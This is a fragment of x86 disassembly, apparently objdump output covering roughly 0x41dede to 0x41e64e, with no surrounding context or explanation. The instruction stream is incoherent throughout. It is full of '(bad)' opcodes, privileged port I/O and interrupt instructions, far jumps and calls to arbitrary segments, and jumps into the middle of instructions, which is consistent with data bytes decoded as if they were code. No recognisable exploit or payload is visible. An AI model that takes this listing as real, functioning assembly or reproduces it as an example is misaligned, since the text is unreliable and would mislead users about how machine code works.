  41dede:	and    DWORD PTR [ebx+0x1eaedfca],esp
  41dee4:	mov    ecx,0x3c2556ed
  41dee9:	mov    eax,0x3b93a8d
  41deee:	es dec ecx
  41def0:	iret   
  41def1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41def2:	adc    esi,DWORD PTR [ebx+0x46]
  41def5:	mov    eax,ds:0xf2590368
  41defa:	xchg   ebp,eax
  41defb:	push   ds
  41defc:	or     DWORD PTR [ebx],0x43
  41deff:	cmp    BYTE PTR [ebx+eiz*1],dh
  41df02:	and    ah,al
  41df04:	jmp    0x9df264a7
  41df09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df0a:	call   ecx
  41df0c:	ins    BYTE PTR es:[edi],dx
  41df0d:	pop    esi
  41df0e:	xchg   ebx,eax
  41df0f:	ins    BYTE PTR es:[edi],dx
  41df10:	lods   eax,DWORD PTR ds:[esi]
  41df11:	je     0x41def4
  41df13:	jbe    0x41df6e
  41df15:	pushf  
  41df16:	jmp    0xa7d8ee69
  41df1b:	mov    ebx,0xb8d72092
  41df20:	mov    al,0xf3
  41df22:	in     eax,0x70
  41df24:	mov    BYTE PTR [esi],dh
  41df26:	ja     0x41df04
  41df28:	push   edx
  41df29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df2a:	pop    edi
  41df2b:	test   eax,0x7d91c79a
  41df30:	repz loopne 0x41def9
  41df33:	push   esi
  41df34:	push   eax
  41df35:	in     eax,0x68
  41df37:	push   esi
  41df38:	push   cs
  41df39:	test   dl,ch
  41df3b:	cmp    eax,ecx
  41df3d:	inc    ebp
  41df3e:	lds    ecx,FWORD PTR [edi+0x9210edc]
  41df44:	xchg   ebp,eax
  41df45:	xchg   BYTE PTR [ebx],ch
  41df47:	std    
  41df48:	and    eax,0xff8cfb67
  41df4d:	outs   dx,BYTE PTR ds:[esi]
  41df4e:	add    ch,bl
  41df50:	inc    esi
  41df51:	inc    ecx
  41df52:	popa   
  41df53:	fcomp  DWORD PTR [ebx]
  41df55:	push   0x979d83df
  41df5a:	pusha  
  41df5b:	sbb    eax,0x3f32c406
  41df60:	jp     0x41dee8
  41df62:	ret    
  41df63:	imul   DWORD PTR [ebx+0x4a]
  41df66:	test   al,0x39
  41df68:	leave  
  41df69:	xor    DWORD PTR ds:0x41ca54c5,ebp
  41df6f:	icebp  
  41df70:	cwde   
  41df71:	out    dx,eax
  41df72:	sbb    bh,BYTE PTR ds:0x81248760
  41df78:	jo     0x41df3c
  41df7a:	pushf  
  41df7b:	push   ss
  41df7c:	pop    ebx
  41df7d:	cmp    esi,esi
  41df7f:	mov    al,0x95
  41df81:	push   edx
  41df82:	sbb    cl,BYTE PTR es:0xfc0d5c09
  41df89:	mov    BYTE PTR [ebx+edi*8],0x38
  41df8d:	ret    0xde54
  41df90:	(bad)  
  41df91:	test   DWORD PTR [edi-0x12],esp
  41df94:	mov    eax,0xb0d0b26a
  41df99:	adc    eax,0x215279e7
  41df9e:	mov    ch,0xdc
  41dfa0:	mov    ds:0x994ba7e5,eax
  41dfa5:	fild   DWORD PTR [eax-0x648efc98]
  41dfab:	fisubr WORD PTR [ecx+edi*1-0x68]
  41dfaf:	mov    cl,dl
  41dfb1:	push   0xe8ba687
  41dfb6:	(bad)  
  41dfb7:	and    eax,0xaa25a814
  41dfbc:	jbe    0x41e004
  41dfbe:	pop    esi
  41dfbf:	dec    edx
  41dfc0:	sbb    eax,0x3c46d1d5
  41dfc5:	mov    edx,0xd708c464
  41dfca:	or     DWORD PTR [ebx+0x6f],0x50
  41dfce:	adc    BYTE PTR [edi-0x53],0x70
  41dfd2:	adc    ch,bl
  41dfd4:	pop    esp
  41dfd5:	sti    
  41dfd6:	jno    0x41e042
  41dfd8:	mov    edi,ebx
  41dfda:	ficom  DWORD PTR [esi+0x334b6b65]
  41dfe0:	(bad)  
  41dfe1:	repz in eax,dx
  41dfe3:	(bad)
  41dfe6:	icebp  
  41dfe7:	push   esp
  41dfe8:	xchg   esi,eax
  41dfe9:	clc    
  41dfea:	test   al,0xab
  41dfec:	mov    cl,0xf0
  41dfee:	sub    DWORD PTR [edx+0x6da80be5],edi
  41dff4:	pushf  
  41dff5:	mov    esp,0x9fe7301e
  41dffa:	sti    
  41dffb:	pushf  
  41dffc:	leave  
  41dffd:	nop
  41dffe:	jecxz  0x41dffb
  41e000:	js     0x41e070
  41e002:	div    edx
  41e004:	pop    edx
  41e005:	(bad)  
  41e006:	sub    esp,edx
  41e008:	fwait
  41e009:	xchg   ebx,eax
  41e00a:	sti    
  41e00b:	int3   
  41e00c:	bnd jns 0x41df9b
  41e00f:	inc    eax
  41e010:	sti    
  41e011:	fistp  WORD PTR [edx+ebx*8+0x3ea26d0c]
  41e018:	xor    eax,0xcb2b1c28
  41e01d:	stos   BYTE PTR es:[edi],al
  41e01e:	leave  
  41e01f:	loopne 0x41e002
  41e021:	cwde   
  41e022:	add    edx,DWORD PTR [ebx]
  41e024:	test   BYTE PTR [ebp+0x6b],0xff
  41e028:	pop    esi
  41e029:	aad    0xe1
  41e02b:	mov    ebp,tr2
  41e02e:	data16 jnp 0x41e015
  41e031:	inc    ebx
  41e032:	out    dx,al
  41e033:	or     BYTE PTR [eax+eax*8],al
  41e036:	and    dl,0x9
  41e039:	add    eax,0xe3581fb8
  41e03e:	jnp    0x41e057
  41e040:	dec    ecx
  41e041:	xchg   edi,eax
  41e042:	mov    BYTE PTR [ebp+0x45b22edb],cl
  41e048:	(bad)  
  41e049:	rcl    BYTE PTR [edi-0xf],1
  41e04c:	(bad)
  41e04f:	mov    edi,0x6dbc29aa
  41e054:	fadd   QWORD PTR [ecx+ebx*2-0x3d9fc55a]
  41e05b:	test   DWORD PTR [ebx-0x65],ebp
  41e05e:	rcl    BYTE PTR [edx-0x1a],cl
  41e061:	lea    ebp,[ebx]
  41e063:	fistp  WORD PTR [eax+edx*4+0x19f851e8]
  41e06a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e06b:	shl    DWORD PTR [ebp+eiz*8-0x113f5297],0xc5
  41e073:	lods   al,BYTE PTR ds:[esi]
  41e074:	stos   BYTE PTR es:[edi],al
  41e075:	retf   
  41e076:	pop    esi
  41e077:	in     eax,dx
  41e078:	cmc    
  41e079:	jmp    0xd23c1e90
  41e07e:	(bad)  
  41e080:	xor    bh,BYTE PTR [edx]
  41e082:	jle    0x41e083
  41e084:	stos   DWORD PTR es:[edi],eax
  41e085:	and    ah,BYTE PTR [edx+0x46]
  41e088:	jmp    0x213c5558
  41e08d:	in     eax,dx
  41e08e:	idiv   BYTE PTR [ecx+0x380e4f57]
  41e094:	pop    es
  41e095:	ds dec ebp
  41e097:	sti    
  41e098:	or     al,0xe2
  41e09a:	pop    es
  41e09b:	ficom  DWORD PTR [eax+0x57]
  41e09e:	out    0x58,al
  41e0a0:	xchg   ebx,eax
  41e0a1:	fwait
  41e0a2:	dec    eax
  41e0a3:	cld    
  41e0a4:	test   BYTE PTR [eax+ebp*1+0x28513197],dl
  41e0ab:	pop    edx
  41e0ac:	and    esp,eax
  41e0ae:	js     0x41e118
  41e0b0:	push   edi
  41e0b1:	fst    DWORD PTR [esi+eax*2-0x8bfa44b]
  41e0b8:	in     eax,0xcc
  41e0ba:	or     al,0xd9
  41e0bc:	arpl   WORD PTR [edi+edi*2],dx
  41e0bf:	rol    dl,cl
  41e0c1:	mov    esp,0xf6d9af87
  41e0c6:	jle    0x41e093
  41e0c8:	shl    BYTE PTR [edi+0x7a],1
  41e0cb:	loopne 0x41e0f0
  41e0cd:	and    ebp,esi
  41e0cf:	sti    
  41e0d0:	cmp    bh,BYTE PTR cs:[eax]
  41e0d3:	push   esi
  41e0d4:	mov    bh,0xc5
  41e0d6:	dec    ebx
  41e0d7:	(bad)  
  41e0d8:	and    ch,BYTE PTR [eax+0x29ebc102]
  41e0de:	jmp    0x33b3298b
  41e0e3:	imul   ebx,DWORD PTR [edx-0x41dd733d],0xd6d3729e
  41e0ed:	jl     0x41e0cf
  41e0ef:	cmp    DWORD PTR [eax+0x21],edi
  41e0f2:	pop    es
  41e0f3:	push   0x197442c2
  41e0f8:	mov    BYTE PTR [eax],bl
  41e0fa:	mov    al,ds:0x8b12fab6
  41e0ff:	dec    edi
  41e100:	add    eax,0x95e4f7ff
  41e105:	ret    0xa46c
  41e108:	inc    ebx
  41e109:	adc    bl,BYTE PTR [ebx-0x20]
  41e10c:	xchg   ebp,eax
  41e10d:	push   DWORD PTR ds:0x166c82bf
  41e113:	test   DWORD PTR [ecx+0x77faf293],0xac00581b
  41e11d:	leave  
  41e11e:	cmp    eax,0x90601509
  41e123:	mov    ebx,0x64790549
  41e128:	push   es
  41e129:	and    BYTE PTR [edx-0x1a],bh
  41e12c:	xchg   ebp,eax
  41e12d:	fisttp WORD PTR ds:0x6747c5fd
  41e133:	out    dx,al
  41e134:	inc    esi
  41e135:	not    BYTE PTR ds:0xdda6c304
  41e13b:	jne    0x41e139
  41e13d:	lods   al,BYTE PTR ds:[esi]
  41e13e:	xor    BYTE PTR [esi+0x39f30e9b],0xe1
  41e145:	ss aaa 
  41e147:	lock xor BYTE PTR [ebx-0x6a],al
  41e14b:	scas   al,BYTE PTR es:[edi]
  41e14c:	stc    
  41e14d:	mov    ecx,0xd974857c
  41e152:	loope  0x41e16b
  41e154:	xchg   edx,eax
  41e155:	push   0xffffffc5
  41e157:	hlt    
  41e158:	adc    BYTE PTR [eax-0xb2d4640],cl
  41e15e:	ins    BYTE PTR es:[edi],dx
  41e15f:	nop
  41e160:	sbb    cl,BYTE PTR [ecx-0x6130b110]
  41e166:	and    edi,DWORD PTR ds:[ebx]
  41e169:	arpl   WORD PTR [esi],bx
  41e16b:	push   ds
  41e16c:	cmp    dl,BYTE PTR [edx+ebp*2-0x138714f2]
  41e173:	cmp    DWORD PTR [esi+0x1f03dfa6],edx
  41e179:	adc    al,dl
  41e17b:	sub    ch,BYTE PTR [eax+edx*8+0x1557c07e]
  41e182:	add    eax,0x2adda0aa
  41e187:	leave  
  41e188:	pop    ds
  41e189:	cmp    eax,0x2c86c79f
  41e18e:	ret    0xf998
  41e191:	lds    edi,FWORD PTR [ecx+0x43]
  41e194:	or     BYTE PTR [edx-0x80],cl
  41e197:	push   0x51
  41e199:	mov    dh,0xf0
  41e19b:	bound  ecx,QWORD PTR [ebp-0x20f8bb67]
  41e1a1:	lahf   
  41e1a2:	out    0x33,al
  41e1a4:	mov    cl,0xb7
  41e1a6:	mov    edx,0x108659e1
  41e1ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e1ac:	es push ebp
  41e1ae:	jle    0x41e198
  41e1b0:	shl    BYTE PTR ds:0x449aaf0c,1
  41e1b6:	adc    eax,0x4d3a0834
  41e1bb:	add    eax,0x13965f27
  41e1c0:	int3   
  41e1c1:	scas   al,BYTE PTR es:[edi]
  41e1c2:	leave  
  41e1c3:	inc    esi
  41e1c4:	je     0x41e214
  41e1c6:	push   cs
  41e1c7:	and    eax,0x43ac613f
  41e1cc:	push   esp
  41e1cd:	test   eax,0x581dcc2e
  41e1d2:	fwait
  41e1d3:	mov    al,0x65
  41e1d5:	(bad)  
  41e1d7:	stc    
  41e1d8:	inc    ebx
  41e1d9:	sub    bl,BYTE PTR [edi]
  41e1db:	dec    esp
  41e1dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e1dd:	fwait
  41e1de:	mov    DWORD PTR [eax],edx
  41e1e0:	adc    DWORD PTR [ebx-0x37c82941],0x96ea64ad
  41e1ea:	daa    
  41e1eb:	lahf   
  41e1ec:	repz pop eax
  41e1ee:	and    DWORD PTR [edi-0x39],eax
  41e1f1:	lds    ebp,FWORD PTR [edx-0x350b3f97]
  41e1f7:	icebp  
  41e1f8:	xchg   edi,eax
  41e1f9:	jge    0x41e1b9
  41e1fb:	ss stc 
  41e1fd:	sub    BYTE PTR [edi],dh
  41e1ff:	call   0xd858e05b
  41e204:	test   DWORD PTR [ebx-0x4c],edi
  41e207:	scas   eax,DWORD PTR es:[edi]
  41e208:	ret    
  41e209:	inc    edx
  41e20a:	push   ss
  41e20b:	hlt    
  41e20c:	ins    DWORD PTR es:[edi],dx
  41e20d:	dec    esi
  41e20e:	cmp    al,0xb4
  41e210:	xchg   esi,eax
  41e211:	xor    ecx,DWORD PTR [ebx-0x1f]
  41e214:	xor    BYTE PTR [ebp-0x3f7e8fad],ah
  41e21a:	xor    al,BYTE PTR [edx-0x62aaf9d3]
  41e220:	jbe    0x41e1d0
  41e222:	pop    edx
  41e223:	xchg   ebp,eax
  41e224:	mov    ecx,0xffcb61de
  41e229:	inc    ebx
  41e22a:	cld    
  41e22b:	mov    edi,0x5aa8eb38
  41e230:	cmp    DWORD PTR [edx+0x21],esp
  41e233:	outs   dx,BYTE PTR ds:[esi]
  41e234:	es in  eax,dx
  41e236:	scas   al,BYTE PTR es:[edi]
  41e237:	add    BYTE PTR [ebx-0x1a],al
  41e23a:	and    DWORD PTR [ecx+0x377f03f3],esi
  41e240:	xor    ecx,DWORD PTR [ecx-0x6b]
  41e243:	sub    BYTE PTR [ecx+0x2faa0f82],cl
  41e249:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e24a:	cmp    al,BYTE PTR [ebp+0x41]
  41e24d:	inc    eax
  41e24e:	sti    
  41e24f:	(bad)  
  41e250:	leave  
  41e251:	jns    0x41e22d
  41e253:	out    dx,eax
  41e254:	mov    dh,0x66
  41e256:	fisubr WORD PTR [esi+eax*1-0xe09568e]
  41e25d:	imul   BYTE PTR [ebx-0x59bd30ad]
  41e263:	xchg   BYTE PTR [ecx-0x16],ch
  41e266:	pop    ds
  41e267:	push   cs
  41e268:	push   es
  41e269:	lods   eax,DWORD PTR ds:[esi]
  41e26a:	pop    edi
  41e26b:	mov    ah,BYTE PTR [ebp+esi*2+0x51]
  41e26f:	xor    al,0x5b
  41e271:	inc    eax
  41e272:	or     al,0xf4
  41e274:	xchg   esp,eax
  41e275:	mov    cl,0xb0
  41e277:	mov    ds:0x26589197,al
  41e27c:	pop    ebx
  41e27d:	fldenv [ebp+0x4e]
  41e280:	mov    al,0x5d
  41e282:	idiv   BYTE PTR [edx+0x38d35e9f]
  41e288:	xchg   edx,eax
  41e289:	adc    eax,0x78922387
  41e28e:	mov    eax,ds
  41e290:	xchg   BYTE PTR [ecx-0x6a],ch
  41e293:	sub    edx,DWORD PTR [esi]
  41e295:	mov    WORD PTR [eax-0x67],cs
  41e298:	dec    esi
  41e299:	sbb    cl,BYTE PTR [ebp+0x4d]
  41e29c:	inc    eax
  41e29d:	sub    DWORD PTR [edx+0xc],esi
  41e2a0:	jl     0x41e232
  41e2a2:	mov    ecx,0x9c0bd7
  41e2a7:	jmp    0xe436:0xca50afee
  41e2ae:	ret    0xdefd
  41e2b1:	add    al,0x24
  41e2b3:	stos   BYTE PTR es:[edi],al
  41e2b4:	xor    dh,BYTE PTR [ecx+ebx*1-0x6d]
  41e2b8:	xchg   BYTE PTR [ebx+eiz*4+0x6f],cl
  41e2bc:	out    dx,al
  41e2bd:	jmp    0xee1b:0x4ac0db14
  41e2c4:	cmp    bl,al
  41e2c6:	pop    edi
  41e2c7:	fs (bad) 
  41e2c9:	test   eax,0xadb73bf
  41e2ce:	call   0xd9e6:0x3ef2ed57
  41e2d5:	push   es
  41e2d6:	ret    0x82d0
  41e2d9:	sbb    DWORD PTR [esi],eax
  41e2db:	xchg   edx,eax
  41e2dc:	cmp    esi,DWORD PTR [ecx+eax*8+0x47]
  41e2e0:	mov    bh,0x95
  41e2e2:	ja     0x41e2c4
  41e2e4:	pop    edx
  41e2e5:	mov    eax,ds:0x212bcbd5
  41e2ea:	(bad)  
  41e2eb:	sbb    cl,BYTE PTR [ecx]
  41e2ed:	inc    ecx
  41e2ee:	daa    
  41e2ef:	cmp    eax,0x1f82107c
  41e2f4:	mov    eax,0x8a176818
  41e2f9:	out    0x6a,al
  41e2fb:	aaa    
  41e2fc:	xor    al,0xe3
  41e2fe:	imul   edi,esi,0x3a94f2d9
  41e304:	(bad)  
  41e306:	leave  
  41e307:	pusha  
  41e308:	test   al,0x29
  41e30a:	retf   
  41e30b:	retf   0xc8a4
  41e30e:	xor    DWORD PTR [ecx-0x7b8cbcf4],ecx
  41e314:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e315:	mov    esi,0x5adfe697
  41e31a:	pop    edx
  41e31b:	xchg   esi,eax
  41e31c:	inc    ebx
  41e31d:	push   es
  41e31e:	add    cl,BYTE PTR [esi-0x18]
  41e321:	add    eax,DWORD PTR [ebx-0x141af971]
  41e327:	icebp  
  41e328:	popa   
  41e329:	das    
  41e32a:	jmp    0x41e2ec
  41e32c:	pop    edx
  41e32d:	jo     0x41e399
  41e32f:	les    esp,FWORD PTR [ebx-0x30]
  41e332:	daa    
  41e333:	in     al,0xf8
  41e335:	add    al,0xd5
  41e337:	into   
  41e338:	ret    0x403d
  41e33b:	je     0x41e2be
  41e33d:	ins    BYTE PTR es:[edi],dx
  41e33e:	sub    eax,0x4c0aa629
  41e343:	in     eax,0x29
  41e345:	loopne 0x41e32f
  41e347:	jbe    0x41e333
  41e349:	sub    al,0x3d
  41e34b:	imul   eax,DWORD PTR [edi-0x7be27605],0x5d
  41e352:	in     eax,dx
  41e353:	out    dx,eax
  41e354:	jp     0x41e388
  41e356:	mov    al,0x22
  41e358:	jg     0x41e313
  41e35a:	dec    edi
  41e35b:	aam    0x88
  41e35d:	mov    ds:0x1420d4bd,al
  41e362:	(bad)  
  41e363:	in     al,0xb0
  41e365:	or     edx,edi
  41e367:	inc    ebp
  41e368:	std    
  41e369:	shl    ah,cl
  41e36b:	mov    ah,0xb1
  41e36d:	shr    DWORD PTR [eax-0x7fce6e2d],cl
  41e373:	cmp    cl,0xa6
  41e376:	xchg   ecx,eax
  41e377:	jg     0x41e32c
  41e379:	xchg   ebp,eax
  41e37a:	dec    esp
  41e37b:	jmp    0x7c23ef4
  41e380:	push   ebx
  41e381:	adc    ebp,eax
  41e383:	sub    bl,al
  41e385:	mov    WORD PTR [eax+0x3657143d],ds
  41e38b:	cwde   
  41e38c:	call   0xd44fc670
  41e391:	push   eax
  41e392:	push   0x56d833aa
  41e397:	add    BYTE PTR [ebx-0x62acda37],0x81
  41e39e:	and    al,cl
  41e3a0:	and    al,0x27
  41e3a2:	cs jb  0x41e3c7
  41e3a5:	int3   
  41e3a6:	inc    ebp
  41e3a7:	push   es
  41e3a8:	push   edi
  41e3a9:	dec    edx
  41e3aa:	popa   
  41e3ab:	(bad)  
  41e3ac:	aad    0xe4
  41e3ae:	sbb    cl,ah
  41e3b0:	int    0xb6
  41e3b2:	jmp    0x41e38c
  41e3b4:	adc    DWORD PTR [edi+0x1d],ecx
  41e3b7:	or     BYTE PTR [edi-0x60],0x85
  41e3bb:	mov    esi,0xc3755ef1
  41e3c0:	enter  0xe34d,0x8f
  41e3c4:	xor    bl,dl
  41e3c6:	lock call 0xf606:0x5d9abf72
  41e3ce:	mov    bl,0x7f
  41e3d0:	push   cs
  41e3d1:	clc    
  41e3d2:	mov    al,ds:0x98abeaee
  41e3d7:	cs push ebx
  41e3d9:	sti    
  41e3da:	mov    edi,0xc35bd54
  41e3df:	sub    eax,0x1388ce8b
  41e3e4:	sbb    BYTE PTR [ecx],ah
  41e3e6:	in     al,dx
  41e3e7:	aam    0xda
  41e3e9:	push   ss
  41e3ea:	fimul  DWORD PTR [ebp+0x5b]
  41e3ed:	iret   
  41e3ee:	mov    eax,ds:0x1e04a5ba
  41e3f3:	mov    bl,0xff
  41e3f5:	in     eax,dx
  41e3f6:	es test dh,dl
  41e3f9:	in     al,dx
  41e3fa:	mov    ch,0x7f
  41e3fc:	dec    esp
  41e3fd:	fcom   DWORD PTR [edi-0x70]
  41e400:	xchg   edi,eax
  41e401:	mov    ebx,ebx
  41e403:	ret    0xaa96
  41e406:	and    esi,DWORD PTR [ecx+0x58]
  41e409:	pop    ebx
  41e40a:	out    dx,al
  41e40b:	data16 or al,0x28
  41e40e:	sbb    al,0x85
  41e410:	in     eax,0x9d
  41e412:	(bad)  
  41e413:	and    eax,0x89a8832b
  41e418:	mov    WORD PTR [ebx],es
  41e41a:	cdq    
  41e41b:	sub    eax,0x125fbbb5
  41e420:	mov    bl,0x96
  41e422:	les    ebp,FWORD PTR [ecx+0x5e5e1646]
  41e428:	imul   ebp,esp,0x22af6422
  41e42e:	cwde   
  41e42f:	sbb    BYTE PTR [edx],bl
  41e431:	(bad)  
  41e432:	push   0xfffffff1
  41e434:	dec    edi
  41e435:	js     0x41e3c1
  41e437:	icebp  
  41e438:	inc    eax
  41e439:	xchg   ebx,eax
  41e43a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e43b:	das    
  41e43c:	(bad)  
  41e43d:	aad    0xf9
  41e43f:	sbb    bl,al
  41e441:	inc    ecx
  41e442:	xchg   DWORD PTR [edx+0x29],esp
  41e445:	pop    eax
  41e446:	mov    bl,0x46
  41e448:	sbb    bh,BYTE PTR [ebx]
  41e44a:	xchg   ebx,eax
  41e44b:	in     al,dx
  41e44c:	push   ebp
  41e44d:	and    DWORD PTR [ecx-0x72b9e216],esp
  41e453:	sub    ebp,DWORD PTR [edx+0xbda2429]
  41e459:	or     DWORD PTR [ecx+ecx*4],0xc50d32de
  41e460:	sbb    dh,cl
  41e462:	cmp    ecx,DWORD PTR [ebp+edx*2-0x38]
  41e466:	xor    DWORD PTR [ecx-0x60],esp
  41e469:	rcr    ch,1
  41e46b:	nop
  41e46c:	lods   eax,DWORD PTR ds:[esi]
  41e46d:	aaa    
  41e46e:	lds    edx,FWORD PTR [ebx+ebp*8+0x5a]
  41e472:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e473:	in     eax,0x10
  41e475:	out    0xf8,eax
  41e477:	xor    al,ah
  41e479:	pop    ds
  41e47a:	dec    ebx
  41e47b:	mov    BYTE PTR [ecx+0x72],dh
  41e47e:	(bad)  
  41e47f:	lods   eax,DWORD PTR ds:[esi]
  41e480:	xchg   ecx,eax
  41e481:	or     ecx,edx
  41e483:	(bad)  
  41e485:	dec    esp
  41e486:	imul   DWORD PTR [ebx]
  41e488:	es imul edi,edi,0xe453decd
  41e48f:	pop    ebp
  41e490:	fimul  DWORD PTR [ecx+edx*4]
  41e493:	addr16 pop esp
  41e495:	sar    edx,cl
  41e497:	xchg   edi,eax
  41e498:	pop    ecx
  41e499:	add    al,0x1a
  41e49c:	cmp    al,0xd3
  41e49e:	pushf  
  41e49f:	scas   eax,DWORD PTR es:[edi]
  41e4a0:	lods   eax,DWORD PTR ds:[esi]
  41e4a1:	xor    al,0x23
  41e4a3:	cmc    
  41e4a4:	sbb    ebp,edx
  41e4a6:	cmp    BYTE PTR [ebp+ebx*1-0x746f969a],al
  41e4ad:	out    dx,eax
  41e4ae:	imul   esi,DWORD PTR [ebp-0x352ca22b],0xffffffe8
  41e4b5:	scas   al,BYTE PTR es:[edi]
  41e4b6:	cmp    ah,dl
  41e4b8:	xlat   BYTE PTR ds:[ebx]
  41e4b9:	int3   
  41e4ba:	out    dx,al
  41e4bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e4bc:	imul   esp,DWORD PTR [ebx-0x16],0x75
  41e4c0:	adc    BYTE PTR ds:0x50a93787,0x13
  41e4c7:	iret   
  41e4c8:	adc    dl,BYTE PTR [ecx-0xdec3e24]
  41e4ce:	aam    0x79
  41e4d0:	stos   BYTE PTR es:[edi],al
  41e4d1:	(bad)  [eax+0x53]
  41e4d4:	pop    ebp
  41e4d5:	scas   eax,DWORD PTR es:[edi]
  41e4d6:	xor    eax,0x7f21263b
  41e4db:	mov    ecx,0x223eab3d
  41e4e0:	iret   
  41e4e1:	mov    ds:0x278bf7cf,eax
  41e4e6:	gs jl  0x41e491
  41e4e9:	or     BYTE PTR [eax],bh
  41e4eb:	sub    ah,bh
  41e4ed:	cdq    
  41e4ee:	stos   BYTE PTR es:[edi],al
  41e4ef:	stos   BYTE PTR es:[edi],al
  41e4f0:	adc    al,BYTE PTR [esi+ecx*1+0x29]
  41e4f4:	addr16 pop ecx
  41e4f6:	call   0x63c5:0x430416a6
  41e4fd:	pop    ss
  41e4fe:	mov    ah,BYTE PTR [edx]
  41e500:	push   edx
  41e501:	bnd jo 0x41e572
  41e504:	jbe    0x41e4df
  41e506:	pushf  
  41e507:	je     0x41e4a8
  41e509:	fldenv [edx-0x708c40d0]
  41e50f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e510:	stos   DWORD PTR es:[edi],eax
  41e511:	jo     0x41e522
  41e513:	test   al,0x4a
  41e515:	popf   
  41e516:	add    DWORD PTR [edx],esp
  41e518:	sbb    eax,0xa57f07a3
  41e51d:	in     al,dx
  41e51e:	mov    edx,ebx
  41e520:	out    0x1e,al
  41e522:	sub    bl,bl
  41e524:	mov    bh,0x4c
  41e526:	inc    esp
  41e527:	cwde   
  41e528:	jmp    0x43da:0x7c020211
  41e52f:	pop    ss
  41e530:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e531:	(bad)  
  41e532:	(bad)  
  41e533:	dec    ebp
  41e534:	pushf  
  41e535:	jb     0x41e5b6
  41e537:	les    ebx,FWORD PTR [eax-0x663d3bf]
  41e53d:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41e53f:	outs   dx,BYTE PTR ds:[esi]
  41e540:	jl     0x41e503
  41e542:	pmullw mm2,QWORD PTR [edi]
  41e545:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e546:	xchg   ebx,eax
  41e547:	jnp    0x41e57a
  41e549:	js     0x41e4ff
  41e54b:	int    0x7a
  41e54d:	jns    0x41e4e8
  41e54f:	mov    esi,0xa7ec0b37
  41e554:	jle    0x41e5ca
  41e556:	xchg   ecx,eax
  41e557:	jmp    0x3cb67f52
  41e55c:	mov    ds:0xadc7a01a,eax
  41e561:	in     eax,dx
  41e562:	stos   DWORD PTR es:[edi],eax
  41e563:	mov    edi,0xbbf9d269
  41e568:	clc    
  41e569:	push   edx
  41e56a:	inc    edi
  41e56b:	outs   dx,DWORD PTR ds:[esi]
  41e56c:	scas   al,BYTE PTR es:[edi]
  41e56d:	mov    ds:0x4c26ecee,al
  41e572:	pop    esi
  41e573:	push   ecx
  41e574:	sub    eax,0xe2781e79
  41e579:	dec    esp
  41e57a:	test   DWORD PTR [ebp+0x5d6b571],ecx
  41e580:	sub    ch,BYTE PTR [ebx-0x36]
  41e583:	push   0x5d2e36da
  41e588:	push   ebp
  41e589:	adc    eax,DWORD PTR ds:0x4e3e19cc
  41e58f:	popa   
  41e590:	adc    al,0x20
  41e592:	push   cs
  41e593:	push   edx
  41e594:	hlt    
  41e595:	je     0x41e54b
  41e597:	cmc    
  41e598:	jmp    edx
  41e59a:	xchg   BYTE PTR [ecx+0x56fa517],ah
  41e5a0:	mov    ebx,0x5a852af
  41e5a5:	inc    ebx
  41e5a6:	pop    esi
  41e5a7:	pop    es
  41e5a8:	pop    ss
  41e5a9:	mov    edx,0x927d451b
  41e5ae:	sti    
  41e5af:	sbb    ah,0x79
  41e5b2:	mov    ds:0x478b8646,eax
  41e5b7:	nop
  41e5b8:	shl    DWORD PTR ds:0x34e4bdcd,cl
  41e5be:	sub    al,0x57
  41e5c0:	jmp    0x41e552
  41e5c2:	pop    ebx
  41e5c3:	nop
  41e5c4:	repnz rol BYTE PTR [edx-0x21106206],0x46
  41e5cc:	xchg   BYTE PTR [ebx-0x42],bl
  41e5cf:	sub    eax,0xadbf2421
  41e5d4:	test   eax,0x6ced11bb
  41e5d9:	fs enter 0xd242,0x9f
  41e5de:	fmul   DWORD PTR [edi+0x5b65e0a3]
  41e5e4:	std    
  41e5e5:	rcr    BYTE PTR [ebx+0x21],cl
  41e5e8:	rcr    BYTE PTR [eax+ebx*1+0x42],0xe4
  41e5ed:	jne    0x41e62f
  41e5ef:	add    dl,ch
  41e5f1:	cmc    
  41e5f2:	ins    DWORD PTR es:[edi],dx
  41e5f3:	mov    edx,DWORD PTR [ebp-0x80]
  41e5f6:	shl    DWORD PTR [edx+0x25],1
  41e5f9:	shr    BYTE PTR [ecx],cl
  41e5fb:	rcl    DWORD PTR [esi-0x5],cl
  41e5fe:	dec    ebp
  41e5ff:	addr16 inc edi
  41e601:	test   al,0x5a
  41e603:	mov    edi,0x6e28fa11
  41e608:	call   0x5d0:0xfbaaa14f
  41e60f:	scas   al,BYTE PTR es:[edi]
  41e610:	mov    BYTE PTR [edi],0xc9
  41e613:	sbb    BYTE PTR [ecx+0x17],dl
  41e616:	js     0x41e59c
  41e618:	popf   
  41e619:	jecxz  0x41e642
  41e61b:	xchg   esp,eax
  41e61c:	dec    esp
  41e61d:	daa    
  41e61e:	sub    BYTE PTR [edi-0x52],0x63
  41e622:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e623:	loope  0x41e5ae
  41e625:	mov    ds:0x884e30e4,al
  41e62a:	out    0x6c,al
  41e62c:	ret    0x5a56
  41e62f:	sbb    eax,0xebbdc016
  41e634:	mul    bl
  41e636:	xchg   ebp,eax
  41e637:	lods   al,BYTE PTR ds:[esi]
  41e638:	loop   0x41e6b3
  41e63a:	ret    0xcf8a
  41e63d:	mov    cl,0x5f
  41e63f:	popa   
  41e640:	pusha  
  41e641:	mov    al,0x3a
  41e643:	pop    eax
  41e644:	sti    
  41e645:	clc    
  41e646:	aaa    
  41e647:	push   cs
  41e648:	mov    esp,ecx
  41e64a:	hlt    
  41e64b:	or     ah,cl
  41e64d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e64e:	les    edi,FWORD PTR [esi]
